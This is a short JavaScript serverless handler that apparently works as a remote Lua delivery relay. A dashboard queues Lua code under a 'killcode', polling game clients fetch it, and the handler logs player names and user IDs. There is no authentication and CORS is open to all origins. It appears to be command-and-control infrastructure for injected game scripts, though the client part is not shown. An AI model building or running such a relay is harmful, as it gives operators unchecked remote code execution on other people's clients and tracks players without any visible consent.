let liveLua = {}; // store single live Lua per killcode

export default function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    const { killcode, player, userid, lua, timestamp, poll } = req.query;

    // Presence
    if(player && userid && killcode){
        console.log(`[Presence] ${player} (${userid}) with killcode ${killcode} is online`);
    }

    // Send Lua from dashboard
    if(lua && killcode){
        liveLua[killcode] = lua; // overwrite any previous code
        console.log(`[Lua queued] ${killcode}: ${lua}`);
        return res.status(200).json({ status: "ok", message: "Lua sent" });
    }

    // Player polling
    if(killcode && poll){
        const code = liveLua[killcode] || null;
        liveLua[killcode] = null; // consume immediately
        return res.status(200).json({ lua: code });
    }

    res.status(200).json({ status: "ok" });
}
